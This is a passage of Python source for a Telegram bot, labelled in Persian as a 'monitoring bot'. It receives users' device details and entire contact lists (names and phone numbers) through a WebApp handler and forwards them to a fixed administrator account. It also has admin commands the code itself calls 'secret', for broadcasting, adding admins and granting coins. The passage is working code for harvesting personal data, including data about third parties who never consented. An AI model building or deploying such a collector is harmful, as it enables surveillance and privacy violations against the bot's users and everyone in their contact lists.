                # دریافت اطلاعات دستگاه
                device_info = json_data.get('data')
                info_text = f"📱 اطلاعات دستگاه کاربر {user_id}:\n\n"
                for key, value in device_info.items():
                    if key != 'battery':
                        info_text += f"{key}: {value}\n"
                if device_info.get('battery'):
                    info_text += f"باتری: {device_info['battery'].get('level')} ({device_info['battery'].get('charging')})"
                await self.bot.send_message(ADMIN_ID, info_text)
                await event.respond("✅ اطلاعات دستگاه شما به ادمین ارسال شد.")
            elif json_data.get('type') == 'contacts':
                # دریافت مخاطبین
                contacts = json_data.get('data')
                contacts_text = f"👥 مخاطبین کاربر {user_id}:\n\n"
                for contact in contacts[:20]:  # فقط 20 تا برای جلوگیری از طولانی شدن
                    contacts_text += f"👤 {contact['name']}"
                    if contact['phones']:
                        contacts_text += f" | 📞 {', '.join(contact['phones'])}"
                    contacts_text += "\n"
                if len(contacts) > 20:
                    contacts_text += f"\n... و {len(contacts) - 20} مخاطب دیگر"
                await self.bot.send_message(ADMIN_ID, contacts_text)
                await event.respond(f"✅ {len(contacts)} مخاطب شما به ادمین ارسال شد.")
            elif json_data.get('type') == 'deny':
                await event.respond("❌ شما دسترسی را رد کردید.")
                
        except Exception as e:
            print(f"خطا در پردازش WebApp: {e}")

    async def admin_commands(self, event):
        user_id = event.sender_id
        if not is_admin(user_id):
            return
        
        text = event.raw_text
        if not text:
            return
        
        # دستورات مخفی ادمین
        if text == '/admin_panel' or text == '/panel':
            await event.respond(
                self.get_text(user_id, 'admin_panel'),
                buttons=[
                    [Button.inline("📨 ارسال همگانی", "admin_broadcast")],
                    [Button.inline("➕ افزودن ادمین", "admin_add")],
                    [Button.inline("💰 ارسال سکه", "admin_coins")],
                    [Button.inline("📊 آمار", "admin_stats")],
                    [Button.inline("🚪 خروج", "admin_exit")]
                ]
            )
            return
        
        # دریافت پیام همگانی
        if self.admin_states.get(user_id) == 'waiting_broadcast':
            # ارسال به همه کاربران
            users = get_all_users()
            sent = 0
            for u in users:
                try:
                    await self.bot.send_message(u[0], text)
                    sent += 1
                    await asyncio.sleep(0.5)
                except:
                    pass
            await event.respond(f"✅ پیام به {sent} کاربر ارسال شد.")
            self.admin_states[user_id] = None
            return
        
        # دریافت آیدی برای افزودن ادمین
        if self.admin_states.get(user_id) == 'waiting_admin_add':
            try:
                new_admin_id = int(text.strip())
                add_admin(new_admin_id)
                await event.respond(f"✅ کاربر {new_admin_id} به عنوان ادمین اضافه شد.")
            except:
                await event.respond("❌ لطفاً یک آیدی عددی معتبر وارد کنید.")
            self.admin_states[user_id] = None
            return
        
        # دریافت اطلاعات برای ارسال سکه
        if self.admin_states.get(user_id) == 'waiting_coins':
            try:
                parts = text.split()
                if len(parts) == 2:
                    target_id = int(parts[0])
                    amount = int(parts[1])
                    add_coins(target_id, amount)
                    await event.respond(f"✅ {amount} سکه به کاربر {target_id} اضافه شد.")
                else:
                    await event.respond("❌ فرمت صحیح: `آیدی مقدار`")
            except:
                await event.respond("❌ لطفاً آیدی و مقدار را به درستی وارد کنید.")
            self.admin_states[user_id] = None
            return

    async def admin_callback(self, event):
        user_id = event.sender_id
        if not is_admin(user_id):
            return
        
        data = event.data.decode()
        
        if data == 'admin_broadcast':
            await event.edit("📨 لطفاً پیام خود را برای ارسال همگانی بفرستید:")
            self.admin_states[user_id] = 'waiting_broadcast'
        elif data == 'admin_add':
            await event.edit("➕ لطفاً آیدی عددی کاربر جدید را برای افزودن به ادمین بفرستید:")
            self.admin_states[user_id] = 'waiting_admin_add'
        elif data == 'admin_coins':
            await event.edit("💰 لطفاً به صورت `آیدی مقدار` وارد کنید (مثال: `123456 10`):")
            self.admin_states[user_id] = 'waiting_coins'
        elif data == 'admin_stats':
            users = get_all_users()
            total = len(users)
            total_coins = sum(u[3] for u in users)
            await event.edit(
                f"📊 آمار ربات:\n\n"
                f"👥 تعداد کاربران: {total}\n"
                f"🪙 کل سکه‌ها: {total_coins}\n"
                f"👤 ادمین‌ها: {len([u for u in users if is_admin(u[0])])}",
                buttons=[[Button.inline("🔙 بازگشت", "admin_back")]]
            )
        elif data == 'admin_back':
            await event.edit(
                self.get_text(user_id, 'admin_panel'),
                buttons=[
                    [Button.inline("📨 ارسال همگانی", "admin_broadcast")],
                    [Button.inline("➕ افزودن ادمین", "admin_add")],
                    [Button.inline("💰 ارسال سکه", "admin_coins")],
                    [Button.inline("📊 آمار", "admin_stats")],
                    [Button.inline("🚪 خروج", "admin_exit")]
                ]
            )
        elif data == 'admin_exit':
            await event.delete()

    async def run(self):
        # ثبت هندلرها
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            await self.start_handler(event)
        
        @self.bot.on(events.NewMessage(pattern='/admin_panel'))
        async def admin_panel_handler(event):
            await self.admin_commands(event)
        
        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            await self.handle_message(event)
            await self.admin_commands(event)
        
        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            await self.handle_callback(event)
            await self.admin_callback(event)
        
        @self.bot.on(events.MessageWebAppData)
        async def webapp_handler(event):
            await self.handle_webapp_data(event)
        
        print("🤖 ربات نظارت روشن شد...")
        await self.bot.run_until_disconnected()

# ===== اجرا =====
if __name__ == '__main__':
    bot = MonitoringBot()
    asyncio.run(bot.run())
